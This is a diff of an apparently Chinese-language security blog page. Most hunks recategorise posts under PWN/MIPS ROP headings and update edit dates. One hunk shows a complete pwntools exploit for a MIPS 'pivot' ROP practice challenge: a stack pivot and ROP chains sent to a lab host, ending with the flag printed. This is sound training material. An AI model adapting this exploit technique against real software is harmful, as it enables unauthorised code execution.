@@ -199,7 +199,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-04 15:11:30" itemprop="dateModified" datetime="2023-04-04T15:11:30+08:00">2023-04-04</time>
+                <time title="Modified: 2023-04-11 13:57:12" itemprop="dateModified" datetime="2023-04-11T13:57:12+08:00">2023-04-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -207,7 +207,11 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/MIPSROP/" itemprop="url" rel="index"><span itemprop="name">MIPSROP</span></a>
                 </span>
             </span>
 
@@ -256,6 +260,7 @@
 <h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">BINARY = <span class="string">&quot;./pivot_mipsel&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">stack_pivot = <span class="number">0x00400CD0</span></span><br><span class="line">load_offset = <span class="number">0x00400CA0</span></span><br><span class="line">read_got = <span class="number">0x00400CB0</span></span><br><span class="line">add_jump = <span class="number">0x00400CC4</span></span><br><span class="line"></span><br><span class="line">foothold_plt = <span class="number">0x400e60</span></span><br><span class="line">foothold_got = <span class="number">0x412060</span></span><br><span class="line"></span><br><span class="line">ret2win_offset = <span class="number">0x378</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;10.0.0.2&quot;</span>, <span class="number">9999</span>)</span><br><span class="line">pivot_addr = p.recvuntil(<span class="string">b&quot;\nSend a ROP chain now and it will land there&quot;</span>).split(<span class="string">b&quot;pivot: &quot;</span>)[-<span class="number">1</span>].split(<span class="string">b&quot;\nSend&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># log.info(pivot_addr)</span></span><br><span class="line">pivot_addr = <span class="built_in">int</span>(pivot_addr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">rop1 = <span class="string">b&quot;A&quot;</span> * <span class="number">8</span> </span><br><span class="line">rop1 += p32(load_offset) <span class="comment"># 下一个ra</span></span><br><span class="line"></span><br><span class="line">rop1 += <span class="string">b&quot;A&quot;</span> * <span class="number">4</span></span><br><span class="line">rop1 += p32(ret2win_offset)</span><br><span class="line">rop1 += p32(foothold_plt)</span><br><span class="line"></span><br><span class="line">rop1 += <span class="string">b&quot;A&quot;</span> * <span class="number">4</span></span><br><span class="line">rop1 += p32(foothold_got)</span><br><span class="line">rop1 += p32(load_offset)</span><br><span class="line"></span><br><span class="line">rop1 += <span class="string">b&quot;A&quot;</span> * <span class="number">4</span></span><br><span class="line">rop1 += p32(ret2win_offset)</span><br><span class="line">rop1 += p32(add_jump)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(rop1)</span><br><span class="line"></span><br><span class="line">rop2 = <span class="string">b&quot;A&quot;</span> * <span class="number">0x20</span></span><br><span class="line">rop2 += p32(pivot_addr)</span><br><span class="line">rop2 += p32(stack_pivot)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(rop2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline_contains(<span class="string">b&quot;ROPE&quot;</span>))</span><br></pre></td></tr></table></figure>
 <p>执行结果如下：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/utest/rop_practice/mipsel/pivot_mipsel/pivot_mipsel&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RUNPATH:  b&#x27;.&#x27;</span><br><span class="line">[+] Opening connection to 10.0.0.2 on port 9999: Done</span><br><span class="line">b&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;&#x27;</span><br><span class="line">[*] Closed connection to 10.0.0.2 port 9999</span><br></pre></td></tr></table></figure>
+
       
     </div>
 
@@ -483,7 +488,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-03 13:06:54" itemprop="dateModified" datetime="2023-04-03T13:06:54+08:00">2023-04-03</time>
+                <time title="Modified: 2023-04-11 13:55:36" itemprop="dateModified" datetime="2023-04-11T13:55:36+08:00">2023-04-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -491,7 +496,11 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/MIPSROP/" itemprop="url" rel="index"><span itemprop="name">MIPSROP</span></a>
                 </span>
             </span>
 
@@ -599,7 +608,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-03 13:07:16" itemprop="dateModified" datetime="2023-04-03T13:07:16+08:00">2023-04-03</time>
+                <time title="Modified: 2023-04-11 13:54:56" itemprop="dateModified" datetime="2023-04-11T13:54:56+08:00">2023-04-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -607,7 +616,11 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/MIPS/" itemprop="url" rel="index"><span itemprop="name">MIPS</span></a>
                 </span>
             </span>
 
@@ -695,7 +708,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-03 13:07:33" itemprop="dateModified" datetime="2023-04-03T13:07:33+08:00">2023-04-03</time>
+                <time title="Modified: 2023-04-11 13:57:50" itemprop="dateModified" datetime="2023-04-11T13:57:50+08:00">2023-04-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -703,7 +716,11 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/MIPSROP/" itemprop="url" rel="index"><span itemprop="name">MIPSROP</span></a>
                 </span>
             </span>
 
@@ -778,7 +795,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-03 13:03:33" itemprop="dateModified" datetime="2023-04-03T13:03:33+08:00">2023-04-03</time>
+                <time title="Modified: 2023-04-11 13:55:26" itemprop="dateModified" datetime="2023-04-11T13:55:26+08:00">2023-04-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -786,7 +803,11 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/MIPSROP/" itemprop="url" rel="index"><span itemprop="name">MIPSROP</span></a>
                 </span>
             </span>
 
@@ -863,7 +884,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-03 13:03:10" itemprop="dateModified" datetime="2023-04-03T13:03:10+08:00">2023-04-03</time>
+                <time title="Modified: 2023-04-11 13:57:37" itemprop="dateModified" datetime="2023-04-11T13:57:37+08:00">2023-04-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -871,7 +892,11 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/MIPSROP/" itemprop="url" rel="index"><span itemprop="name">MIPSROP</span></a>
                 </span>
             </span>
 
@@ -948,7 +973,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-03-31 16:41:12" itemprop="dateModified" datetime="2023-03-31T16:41:12+08:00">2023-03-31</time>
+                <time title="Modified: 2023-04-11 13:56:58" itemprop="dateModified" datetime="2023-04-11T13:56:58+08:00">2023-04-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -956,7 +981,11 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/MIPSROP/" itemprop="url" rel="index"><span itemprop="name">MIPSROP</span></a>
                 </span>
             </span>
 
@@ -1055,7 +1084,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-03-20 14:08:58" itemprop="dateModified" datetime="2023-03-20T14:08:58+08:00">2023-03-20</time>
+                <time title="Modified: 2023-04-11 13:46:32" itemprop="dateModified" datetime="2023-04-11T13:46:32+08:00">2023-04-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1063,7 +1092,11 @@
               </span>
               <span class="post-meta-item-text">In</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Log/" itemprop="url" rel="index"><span itemprop="name">Log</span></a>
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/gdb/" itemprop="url" rel="index"><span itemprop="name">gdb</span></a>
                 </span>
             </span>
 
@@ -1189,7 +1222,7 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
